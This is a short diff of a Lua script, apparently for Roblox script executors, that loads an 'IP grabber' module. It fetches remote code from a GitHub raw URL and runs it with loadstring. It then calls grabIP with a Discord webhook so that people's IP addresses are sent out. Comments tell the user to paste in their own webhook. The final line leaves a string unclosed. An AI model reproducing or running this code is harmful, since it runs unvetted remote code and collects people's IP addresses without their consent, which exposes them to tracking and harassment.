@@ -1,5 +1,4 @@
--- to use this just put ur webhook into the value of _G.WebhookUrl and exec lol
+-- get the script below and replace the link in the grabip function with your webhook lnk
+local IPGrabber = loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
 
-
-_G.WebhookUrl = "https://discordapp.com/<webhook>"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/RandomStuff/main/grab/funny.lua"))()
+IPGrabber:grabIP("<https://discord.com/api/webhooks>)
